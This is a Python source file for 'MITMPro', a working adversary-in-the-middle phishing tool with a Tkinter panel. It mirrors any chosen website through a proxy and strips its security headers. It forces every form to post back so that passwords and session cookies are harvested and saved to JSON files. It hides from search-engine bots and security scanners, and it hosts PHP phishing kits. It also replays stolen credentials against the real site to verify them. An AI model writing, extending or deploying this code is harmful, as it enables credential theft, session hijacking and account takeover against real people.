import os
import re
import shutil
import subprocess
import threading
import requests
import time
import json
from urllib.parse import urlparse, urljoin
from flask import Flask, request, Response

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

from mitmpro import common
from mitmpro.common import PROJECT_ROOT

# Global Flask app for the aITM (Adversary-in-the-Middle) engine
phish_app = Flask(__name__)
_creds_lock = threading.Lock()
captured_creds = [] # List of {target, user, pass, cookies, timestamp, verified}
phish_app.config['MODE'] = 'MIRROR' # 'MIRROR' or 'TEMPLATE'
phish_app.config['TEMPLATE_PATH'] = ''

# ---------------------------------------------------------------------------
# Advanced mirroring engine
# ---------------------------------------------------------------------------
# A single persistent session gives us connection pooling + cookie continuity
# so the mirrored site behaves like a real browser across requests.
_mirror_session = requests.Session()
_server_shutdown = threading.Event()

# Full, realistic browser fingerprint. Real-world sites (Google, Facebook,
# LinkedIn, banks, etc.) reject requests that look like scripts, so we present
# a complete, current Chrome fingerprint by default.
BROWSER_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"),
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
               "image/avif,image/webp,image/apng,*/*;q=0.8"),
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24", "Google Chrome";v="125"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
}

# Headers that must never be forwarded verbatim between client<->target.
_HOP_BY_HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade", "host", "content-length",
    "content-encoding", "accept-encoding", "strict-transport-security",
    "content-security-policy", "content-security-policy-report-only",
    "x-frame-options", "public-key-pins", "expect-ct",
}

_CSS_URL_RE = re.compile(r"""url\(\s*(['"]?)([^'")]+)\1\s*\)""", re.IGNORECASE)


def normalize_target(url):
    """Return a clean absolute base URL, defaulting to https:// when no scheme
    is supplied (so 'google.com' just works)."""
    url = (url or "").strip()
    if not url:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", url):
        url = "https://" + url
    return url.rstrip("/")


def _target_parts():
    """Return (origin, netloc) for the currently configured target."""
    base = normalize_target(phish_app.config.get("TARGET_URL", ""))
    if not base:
        return "", ""
    p = urlparse(base)
    return f"{p.scheme}://{p.netloc}", p.netloc


def _rewrite_url(u, target_netloc):
    """Rewrite a single URL so target-origin links route back through the proxy
    while third-party (CDN) links keep working directly."""
    if not u:
        return u
    us = u.strip()
    low = us.lower()
    if low.startswith(("data:", "javascript:", "mailto:", "tel:", "#", "blob:", "about:")):
        return u
    if us.startswith("//"):
        netloc = us[2:].split("/", 1)[0]
        if netloc == target_netloc:
            rest = us[2:].split("/", 1)
            return "/" + (rest[1] if len(rest) > 1 else "")
        return "https:" + us
    if low.startswith(("http://", "https://")):
        p = urlparse(us)
        if p.netloc == target_netloc:
            path = p.path or "/"
            if p.query:
                path += "?" + p.query
            if p.fragment:
                path += "#" + p.fragment
            return path
        return us
    return u


def _rewrite_css(css, target_netloc):
    """Rewrite url(...) references inside CSS."""
    def repl(m):
        quote, u = m.group(1), m.group(2).strip()
        new = _rewrite_url(u, target_netloc)
        return f"url({quote}{new}{quote})"
    try:
        css = _CSS_URL_RE.sub(repl, css)
        css = re.sub(r"@import\s+(['\"])([^'\"]+)\1",
                     lambda m: f"@import {m.group(1)}{_rewrite_url(m.group(2), target_netloc)}{m.group(1)}",
                     css)
    except Exception:
        pass
    return css


def _rewrite_html(html, target_netloc):
    """Rewrite every navigable/asset URL in an HTML document so the mirror
    renders fully through the proxy (links, images, CSS, JS, media, srcset,
    inline styles) and every form posts back to us for capture."""
    soup = BeautifulSoup(html, "html.parser")

    # <base> breaks relative resolution against the proxy — drop it.
    for b in soup.find_all("base"):
        b.decompose()

    attr_map = {
        "a": "href", "link": "href", "area": "href", "use": "href",
        "script": "src", "img": "src", "iframe": "src", "source": "src",
        "video": "src", "audio": "src", "embed": "src", "track": "src",
        "input": "src", "object": "data", "form": "action",
    }
    for tag in soup.find_all(True):
        name = tag.name.lower()
        attr = attr_map.get(name)
        if attr and tag.has_attr(attr):
            tag[attr] = _rewrite_url(tag.get(attr), target_netloc)
        for extra in ("poster", "data-src", "data-href", "data-url", "formaction"):
            if tag.has_attr(extra):
                tag[extra] = _rewrite_url(tag.get(extra), target_netloc)
        if tag.has_attr("srcset"):
            parts = []
            for item in tag["srcset"].split(","):
                seg = item.strip().split(None, 1)
                if seg:
                    seg[0] = _rewrite_url(seg[0], target_netloc)
                    parts.append(" ".join(seg))
            tag["srcset"] = ", ".join(parts)
        if tag.has_attr("style"):
            tag["style"] = _rewrite_css(tag["style"], target_netloc)

    # Force every form to POST back to the proxy so credentials are captured.
    for form in soup.find_all("form"):
        form["method"] = "POST"

    for st in soup.find_all("style"):
        if st.string:
            st.string.replace_with(_rewrite_css(st.get_text(), target_netloc))

    return str(soup)


def _forward_headers(cookies_only=False):
    """Build outbound headers: pass through the victim's genuine browser
    fingerprint when present (best for bypassing anti-bot), otherwise fall back
    to a complete, current Chrome fingerprint so scripted/empty clients still
    get served. The Host/anti-bot bits are handled for us."""
    origin, netloc = _target_parts()
    headers = {}
    for k, v in request.headers.items():
        lk = k.lower()
        if lk in _HOP_BY_HOP:
            continue
        if lk in ("referer", "origin"):
            continue
        headers[k] = v
    # If the client isn't a real browser, present our full Chrome fingerprint.
    ua = headers.get("User-Agent", "")
    if "Mozilla" not in ua:
        for k, v in BROWSER_HEADERS.items():
            headers[k] = v
    else:
        # Real browser: only fill in anything it didn't send.
        for k, v in BROWSER_HEADERS.items():
            headers.setdefault(k, v)
    if origin:
        headers["Referer"] = origin + "/"
        # Real browsers only send Origin on state-changing / cross-origin
        # requests (POST). Sending it on a top-level GET navigation looks like
        # a bot and trips protections (e.g. Wikipedia 403).
        if request.method == "POST":
            headers["Origin"] = origin
            headers["Sec-Fetch-Site"] = "same-origin"
    return headers


def _build_response(resp, target_netloc):
    """Turn an upstream requests.Response into a Flask Response, rewriting HTML
    and CSS bodies and stripping headers that would break the mirror."""
    ctype = resp.headers.get("Content-Type", "") or "application/octet-stream"
    low = ctype.lower()
    if "text/html" in low:
        body = _rewrite_html(resp.text, target_netloc)
        data = body.encode("utf-8", "replace")
    elif "text/css" in low:
        data = _rewrite_css(resp.text, target_netloc).encode("utf-8", "replace")
    else:
        data = resp.content
    out = Response(data, status=resp.status_code, content_type=ctype)
    for k, v in resp.headers.items():
        if k.lower() in _HOP_BY_HOP or k.lower() == "content-type":
            continue
        if k.lower() in ("set-cookie", "location"):
            if k.lower() == "location":
                v = _rewrite_url(v, target_netloc)
            out.headers[k] = v
    return out


def _save_creds_to_file():
    """Persist all captured credentials and cookies to /output/."""
    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        export = []
        with _creds_lock:
            snapshot = list(captured_creds)
        for c in snapshot:
            entry = {
                "timestamp": c.get("timestamp", ""),
                "target": c.get("target", ""),
                "path": c.get("path", ""),
                "ip": c.get("ip", ""),
                "data": c.get("data", {}),
                "cookies": c.get("cookies", {}),
                "verified": c.get("verified", False),
            }
            export.append(entry)
        out_path = os.path.join(OUTPUT_DIR, "credentials.json")
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(export, f, indent=2, ensure_ascii=False, default=str)
        verified = [c for c in export if c.get("verified")]
        if verified:
            v_path = os.path.join(OUTPUT_DIR, "verified_credentials.json")
            with open(v_path, "w", encoding="utf-8") as f:
                json.dump(verified, f, indent=2, ensure_ascii=False, default=str)
        all_cookies = []
        for c in export:
            if c.get("cookies"):
                all_cookies.append({
                    "target": c.get("target", ""),
                    "ip": c.get("ip", ""),
                    "cookies": c["cookies"],
                    "timestamp": c.get("timestamp", ""),
                    "verified": c.get("verified", False),
                })
        if all_cookies:
            c_path = os.path.join(OUTPUT_DIR, "cookies.json")
            with open(c_path, "w", encoding="utf-8") as f:
                json.dump(all_cookies, f, indent=2, ensure_ascii=False, default=str)
        lines = []
        for c in export:
            st = "VERIFIED" if c.get("verified") else "UNVERIFIED"
            ds = json.dumps(c.get("data", {}), ensure_ascii=False)
            cs = json.dumps(c.get("cookies", {}), ensure_ascii=False)
            lines.append(f"[{st}] {c.get('timestamp', '')} | {c.get('ip', '')} | {c.get('target', '')}{c.get('path', '')}\n  Creds: {ds}\n  Cookies: {cs}\n")
        txt_path = os.path.join(OUTPUT_DIR, "all_captures.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(f"MITMPro Credential Capture Log\nGenerated: {time.ctime()}\nTotal: {len(export)} | Verified: {len(verified)}\n" + "=" * 70 + "\n\n")
            for line in lines:
                f.write(line + "\n")
    except Exception:
        pass

def _save_creds_on_capture():
    """Call after every new capture to persist immediately."""
    threading.Thread(target=_save_creds_to_file, daemon=True).start()


_PHP_BIN = None


def _find_php():
    global _PHP_BIN
    if _PHP_BIN is not None:
        return _PHP_BIN
    for name in ("php-cgi", "php"):
        p = shutil.which(name)
        if p:
            _PHP_BIN = p
            break
    return _PHP_BIN


class _PHPServer:
    """Hosts a template directory via PHP's built-in server (``php -S``).

    Using the built-in server (rather than invoking php-cgi per request) means
    POST data, includes, sessions and redirects all behave exactly as the
    phishing kit expects, requiring only the ``php`` CLI binary.
    """

    def __init__(self):
        self.proc = None
        self.port = 0
        self.docroot = None
        self._lock = threading.Lock()

    def start(self, docroot):
        with self._lock:
            if self.proc is not None and self.docroot == docroot \
                    and self.proc.poll() is None:
                return
            self.stop()
            php = _find_php()
            if not php:
                return
            import socket
            s = socket.socket()
            s.bind(("127.0.0.1", 0))
            self.port = s.getsockname()[1]
            s.close()
            self.docroot = docroot
            try:
                self.proc = subprocess.Popen(
                    [php, "-S", f"127.0.0.1:{self.port}", "-t", docroot],
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                self.proc = None

    def stop(self):
        with self._lock:
            if self.proc is not None:
                try:
                    self.proc.terminate()
                except Exception:
                    pass
                try:
                    self.proc.wait(timeout=3)
                except Exception:
                    try:
                        self.proc.kill()
                    except Exception:
                        pass
                self.proc = None

    def ensure(self, docroot):
        if self.proc is None or self.docroot != docroot \
                or self.proc.poll() is not None:
            self.start(docroot)
        return self.proc is not None

    def url(self, path):
        return "http://127.0.0.1:{}/{}".format(self.port, (path or "").lstrip("/"))


_php_server = _PHPServer()


def _serve_template(path, req, raw_body=b""):
    """Serve a file from the active template directory via the PHP server so
    PHP templates render correctly and their login forms actually submit.

    Works for both GET and POST. Credential capture is handled separately by
    the POST branch of ``proxy_engine`` before this is called.
    """
    tpl_root = phish_app.config.get('TEMPLATE_PATH', '')
    if not tpl_root:
        return "<h1>No Template Selected</h1>", 500
    if not _php_server.ensure(tpl_root):
        return ("<h1>PHP runtime not found</h1>"
                "<p>This template requires PHP. Install <b>php</b> and restart "
                "the engine to use PHP templates.</p>", 500)
    # Prevent path traversal: block any attempt to escape the template root.
    try:
        real_tpl = os.path.realpath(tpl_root)
        real_file = os.path.realpath(os.path.join(tpl_root, path or ""))
        if not (real_file == real_tpl or real_file.startswith(real_tpl + os.sep)):
            return "<h1>403 Forbidden</h1>", 403
    except Exception:
        return "<h1>403 Forbidden</h1>", 403
    url = _php_server.url(path or "/")
    fwd = {k: v for k, v in req.headers.items()
           if k.lower() not in ("host", "content-length")}
    try:
        resp = requests.request(
            req.method, url, data=raw_body or None, headers=fwd,
            cookies=req.cookies, params=req.args, timeout=25,
            allow_redirects=False, verify=False)
    except requests.RequestException as e:
        return f"<h1>Template Error</h1><pre>{e}</pre>", 502
    excluded = {"transfer-encoding", "connection", "content-encoding",
                "content-length", "server", "date"}
    out = Response(resp.content, status=resp.status_code,
                   content_type=resp.headers.get("Content-Type", "text/html"))
    for k, v in resp.headers.items():
        if k.lower() in excluded:
            continue
        try:
            out.headers[k] = v
        except Exception:
            pass
    return out

@phish_app.before_request
def filter_bots():
    # Basic cloaking: Block common security scanners
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'lighthouse', 'headlesschrome', 'zgrab', 'masscan', 'nmap', 'sqlmap']
    if any(bot in ua for bot in bots):
        return "<h1>404 Not Found</h1>", 404

@phish_app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@phish_app.route('/<path:path>', methods=['GET', 'POST'])
def proxy_engine(path):
    mode = phish_app.config.get('MODE', 'MIRROR')
    origin, target_netloc = _target_parts()

    if request.method == 'POST':
        # Read the raw body first so it can be forwarded to a PHP template
        # later (Flask consumes the stream once form parsing begins).
        raw_body = request.get_data() or b""

        # INTERCEPT: Capture all POST data (credentials) regardless of mode.
        # Modern sites submit logins as form-encoded, JSON, or query params, so
        # we harvest every possible source to guarantee capture.
        data = request.form.to_dict()
        if not data:
            try:
                js = request.get_json(force=True, silent=True)
                if isinstance(js, dict):
                    data = {k: v for k, v in js.items()}
            except Exception:
                pass
        if not data:
            raw = raw_body.decode("utf-8", "replace")
            if raw:
                try:
                    from urllib.parse import parse_qs
                    parsed = parse_qs(raw)
                    if parsed:
                        data = {k: (v[0] if len(v) == 1 else v) for k, v in parsed.items()}
                    else:
                        data = {"_raw_body": raw[:4096]}
                except Exception:
                    data = {"_raw_body": raw[:4096]}
        if request.args:
            for k, v in request.args.items():
                data.setdefault(k, v)
        if data:
            entry = {
                "target": phish_app.config.get('TARGET_URL', 'Local Template'),
                "path": path,
                "data": data,
                "cookies": dict(request.cookies),
                "ip": request.remote_addr,
                "timestamp": time.ctime(),
                "verified": False
            }
            with _creds_lock:
                captured_creds.append(entry)
            _save_creds_on_capture()

        if mode == 'MIRROR':
            if not origin:
                return "<h1>Configuration Missing</h1><p>Please set a target URL in the MITMPro Phishing Panel.</p>", 500
            full_url = urljoin(origin + "/", path)
            try:
                resp = _mirror_session.post(
                    full_url, data=request.form, cookies=request.cookies,
                    headers=_forward_headers(), params=request.args,
                    timeout=20, verify=False, allow_redirects=True)
                return _build_response(resp, target_netloc)
            except requests.RequestException as e:
                return f"Proxy Error: {e}", 502
        else:
            # Template mode: render & execute the PHP/HTML template so the
            # submitted form is processed by the kit (not a stub page).
            return _serve_template(path, request, raw_body)

    # GET request
    if mode == 'MIRROR':
        if not origin:
            return "<h1>Configuration Missing</h1><p>Please set a target URL in the MITMPro Phishing Panel.</p>", 500
        full_url = urljoin(origin + "/", path)
        try:
            resp = _mirror_session.get(
                full_url, cookies=request.cookies,
                headers=_forward_headers(), params=request.args,
                timeout=20, verify=False, allow_redirects=True)
            return _build_response(resp, target_netloc)
        except requests.RequestException as e:
            return f"Proxy Error: {e}", 502
    else:
        # Template mode: serve static files from the selected template directory
        return _serve_template(path, request)

class PhishServerThread(threading.Thread):
    def __init__(self, server):
        super().__init__(daemon=True)
        self._server = server

    def run(self):
        _server_shutdown.clear()
        try:
            self._server.serve_forever()
        except Exception:
            pass

    def shutdown(self):
        if self._server:
            try:
                self._server.shutdown()
            except Exception:
                pass
            _server_shutdown.set()

from mitmpro.ai_components import AIHelperTab

class MasqueradingPanel(ttk.Notebook):
    def __init__(self, master):
        super().__init__(master)
        
        self.main_frame = ttk.Frame(self)
        self.add(self.main_frame, text="Masquerading Engine")
        
        self.tpl_frame = ttk.Frame(self)
        self.add(self.tpl_frame, text="Template Gallery")
        
        self.add(AIHelperTab(self, "Website Masquerading"), text="AI Helper")
        
        # Main Frame Layout
        self.main_frame.columnconfigure(0, weight=1)
        self.main_frame.rowconfigure(2, weight=1)

        top = ttk.Frame(self.main_frame)
        top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        top.columnconfigure(1, weight=1)
        ttk.Label(top, text="Target Site (e.g. https://google.com):").grid(row=0, column=0)
        self.url_entry = ttk.Entry(top)
        self.url_entry.grid(row=0, column=1, sticky="ew")
        self.url_entry.insert(0, "https://example.com")
        ttk.Button(top, text="Deploy Mirror", command=self.deploy).grid(row=0, column=2, padx=6)

        ttk.Label(top, text="Ollama Model:").grid(row=0, column=3, padx=(10, 0))
        self.model_cb = ttk.Combobox(top, width=22, state="readonly")
        self.model_cb.grid(row=0, column=4)
        self.model_cb.bind("<<ComboboxSelected>>",
                           lambda e: common.set_model(self.model_cb.get()))
        common.register_model_listener(self._on_model_change)
        self._refresh_models()
        
        mid = ttk.Frame(self.main_frame)
        mid.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Label(mid, text="Local Port:").grid(row=0, column=0)
        self.port_entry = ttk.Entry(mid, width=10)
        self.port_entry.grid(row=0, column=1, sticky="w")
        self.port_entry.insert(0, "8080")
        ttk.Button(mid, text="Start Engine", command=self.start_server).grid(row=0, column=2, padx=6)
        self.status_lbl = ttk.Label(mid, text="Engine: STOPPED", foreground="red")
        self.status_lbl.grid(row=0, column=3, padx=10)
        ttk.Button(mid, text="Validate Creds", command=self.validate_all).grid(row=0, column=4, padx=6)
        ttk.Button(mid, text="Clear Captures", command=self.clear_captures).grid(row=0, column=5, padx=6)

        self.tree_frame = ttk.Frame(self.main_frame)
        self.tree_frame.grid(row=2, column=0, sticky="nsew", padx=4, pady=4)
        self.tree_frame.columnconfigure(0, weight=1)
        self.tree_frame.rowconfigure(0, weight=1)
        cols = ("Timestamp", "IP", "Target", "Data", "Status")
        self.tree = ttk.Treeview(self.tree_frame, columns=cols, show="headings")
        for c in cols: self.tree.heading(c, text=c)
        self.tree.column("Timestamp", width=150)
        self.tree.column("IP", width=100)
        self.tree.column("Target", width=200)
        self.tree.column("Data", width=400)
        self.tree.column("Status", width=100)
        self.scrollbar = ttk.Scrollbar(self.tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=self.scrollbar.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        self.scrollbar.grid(row=0, column=1, sticky="ns")
        
        self.server_thread = None
        self._timer_id = None
        self.update_logs()

        # Template Gallery Layout
        self.tpl_frame.columnconfigure(0, weight=1)
        self.tpl_frame.rowconfigure(0, weight=1)
        
        self.tpl_list = ttk.Treeview(self.tpl_frame, columns=("Name", "Source", "Type"), show="headings")
        self.tpl_list.heading("Name", text="Template Name")
        self.tpl_list.heading("Source", text="Source Toolkit")
        self.tpl_list.heading("Type", text="Type")
        self.tpl_list.column("Name", width=300)
        self.tpl_list.column("Source", width=150)
        self.tpl_list.column("Type", width=100)

        self.tpl_list.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)
        
        tpl_scroll = ttk.Scrollbar(self.tpl_frame, orient="vertical", command=self.tpl_list.yview)
        self.tpl_list.configure(yscrollcommand=tpl_scroll.set)
        tpl_scroll.grid(row=0, column=1, sticky="ns")
        
        btn_frame = ttk.Frame(self.tpl_frame)
        btn_frame.grid(row=1, column=0, sticky="ew", padx=4, pady=4)
        ttk.Button(btn_frame, text="Refresh Templates", command=self.refresh_templates).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Deploy Selected Template", command=self.deploy_template).pack(side="left", padx=5)
        
        self.refresh_templates()

    def refresh_templates(self):
        self.tpl_list.delete(*self.tpl_list.get_children())
        tpl_root = os.path.join(PROJECT_ROOT, "mitmpro", "templates")
        if not os.path.exists(tpl_root): return
        
        # Load all local template directories
        for source in ["phishbait", "blackphish"]:
            source_path = os.path.join(tpl_root, source)
            if os.path.exists(source_path):
                for name in os.listdir(source_path):
                    if os.path.isdir(os.path.join(source_path, name)):
                        self.tpl_list.insert("", "end", values=(name, source, "extracted"))




    def deploy_template(self):
        selected = self.tpl_list.selection()
        if not selected:
            messagebox.showerror("Error", "Please select a template first.")
            return
        
        item = self.tpl_list.item(selected[0])
        name, source, t_type = item['values']
        
        # All templates are now local and extracted
        tpl_path = os.path.join(PROJECT_ROOT, "mitmpro", "templates", source, name)
        
        if not os.path.exists(tpl_path):
            messagebox.showerror("Error", f"Template directory not found: {tpl_path}")
            return

        phish_app.config['MODE'] = 'TEMPLATE'
        phish_app.config['TEMPLATE_PATH'] = tpl_path
        phish_app.config['TARGET_URL'] = f"Template: {name}"
        
        messagebox.showinfo("Deployed", f"Template {name} from {source} is now active.")



    def start_server(self, **kwargs):
        if self.server_thread and self.server_thread.is_alive():
            messagebox.showinfo("Info", "Engine is already running.")
            return
        try:
            port = int(self.port_entry.get())
        except (ValueError, TypeError):
            messagebox.showerror("Error", "Port must be a number.")
            return
        try:
            from werkzeug.serving import make_server
            srv = make_server('0.0.0.0', port, phish_app, threaded=True)
        except Exception as e:
            messagebox.showerror("Error", f"Could not start server on port {port}: {e}")
            return
        self.server_thread = PhishServerThread(srv)
        self.server_thread.start()
        self.status_lbl.config(text=f"Engine: RUNNING on port {port}", foreground="green")

    def deploy(self, url=None, **kwargs):
        if url is None:
            url = self.url_entry.get().strip()
        url = normalize_target(url)
        if not url:
            messagebox.showerror("Error", "Please enter a target URL.")
            return
        phish_app.config['MODE'] = 'MIRROR'
        phish_app.config['TARGET_URL'] = url
        _php_server.stop()
        try:
            self.url_entry.delete(0, "end")
            self.url_entry.insert(0, url)
        except Exception:
            pass
        messagebox.showinfo("Deployed", f"Reverse Proxy active for {url}.")

    def _refresh_models(self):
        try:
            models = common.ollama_models()
            self.model_cb["values"] = models
            cur = common.SELECTED_MODEL
            if cur and cur in models:
                self.model_cb.set(cur)
            elif models:
                self.model_cb.set(models[0])
        except Exception:
            pass

    def _on_model_change(self, model):
        try:
            if not self.winfo_exists():
                return
            if model and self.model_cb["values"]:
                self.model_cb.set(model)
        except Exception:
            pass

    def clear_captures(self):
        with _creds_lock:
            captured_creds.clear()
        _save_creds_to_file()
        self.update_logs()
        messagebox.showinfo("Cleared", "All captured credentials have been removed.")

    def validate_all(self):
        def worker():
            from urllib.parse import urljoin as _uj
            with _creds_lock:
                snapshot = list(captured_creds)
            verified_count = 0
            for entry in snapshot:
                if entry.get('verified'):
                    continue
                data = entry.get('data', {})
                user = data.get('email') or data.get('username') or data.get('login')
                pwd = data.get('password') or data.get('pass')
                if not (user and pwd):
                    continue
                target = entry.get('target', '')
                path = entry.get('path', '')
                if not target.startswith('http'):
                    # Captured from a local template — nothing live to validate
                    # against, so mark it explicitly rather than silently skip.
                    with _creds_lock:
                        entry['verified'] = False
                        entry['verify_note'] = 'local-only (no live target)'
                    continue
                verify_url = target
                if path:
                    verify_url = _uj(target.rstrip('/') + '/', path)
                try:
                    r = requests.post(verify_url, data=data, timeout=15,
                                      verify=False, allow_redirects=True)
                    body = (r.text or "").lower()
                    failure_markers = ['invalid', 'incorrect', 'wrong',
                                        'failed', 'try again', 'does not match',
                                        'badpassword', 'no account']
                    looks_failed = any(m in body for m in failure_markers) \
                        and r.status_code < 400
                    if r.status_code < 400 and not looks_failed:
                        with _creds_lock:
                            entry['verified'] = True
                        verified_count += 1
                    else:
                        with _creds_lock:
                            entry['verified'] = False
                            entry['verify_note'] = f"status {r.status_code}"
                except requests.RequestException as ex:
                    with _creds_lock:
                        entry['verify_note'] = f'request error: {ex}'
            _save_creds_to_file()
            self.after(0, lambda: messagebox.showinfo(
                "Validation",
                f"Credential verification pass complete. {verified_count} "
                f"verified. Results saved to /output/."))
        threading.Thread(target=worker, daemon=True).start()

    def update_logs(self):
        try:
            if not self.winfo_exists():
                return
        except Exception:
            return
        self.tree.delete(*self.tree.get_children())
        with _creds_lock:
            snapshot = list(captured_creds)
        for entry in snapshot:
            status = "VERIFIED" if entry['verified'] else "UNVERIFIED"
            self.tree.insert("", "end", values=(entry['timestamp'], entry['ip'], entry['target'], str(entry['data']), status))
        try:
            self._timer_id = self.after(3000, self.update_logs)
        except Exception:
            pass

    def destroy(self):
        try:
            _php_server.stop()
        except Exception:
            pass
        if self._timer_id:
            try:
                self.after_cancel(self._timer_id)
            except Exception:
                pass
            self._timer_id = None
        if self.server_thread and self.server_thread.is_alive():
            try:
                self.server_thread.shutdown()
                self.server_thread.join(timeout=5)
            except Exception:
                pass
        super().destroy()
